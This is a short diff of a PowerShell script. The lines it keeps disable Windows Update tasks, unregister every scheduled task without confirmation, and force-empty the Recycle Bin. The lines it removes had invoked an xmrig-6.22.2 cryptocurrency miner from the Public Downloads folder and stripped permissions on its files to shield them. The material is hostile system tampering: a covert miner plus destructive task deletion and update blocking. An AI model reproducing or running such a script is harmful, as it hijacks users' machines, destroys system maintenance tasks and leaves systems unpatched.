@@ -72,11 +72,4 @@ Get-ScheduledTask | Where-Object {$_.TaskPath -like "\Microsoft\Windows\WindowsU
 Get-ScheduledTask | Where-Object {$_.TaskName -like "*reboot*" -or $_.TaskName -like "*restart*"} | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false}
 Get-ScheduledTask | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -TaskPath $_.TaskPath -Confirm:$false}
 Clear-RecycleBin -Force
-Get-ChildItem "C:\Users\Public\Downloads" -File | ForEach-Object {
-    icacls $_.FullName /inheritance:r /grant:r "Administrators:R" /deny "Everyone:W"
-}
-C:\Users\Public\Downloads\xmrig-6.22.2
-Get-ChildItem "C:\Users\Public\Downloads\xmrig-6.22.2" -File | ForEach-Object {
-    icacls $_.FullName /inheritance:r /grant:r "Administrators:R" /deny "Everyone:W"
-}
 exit
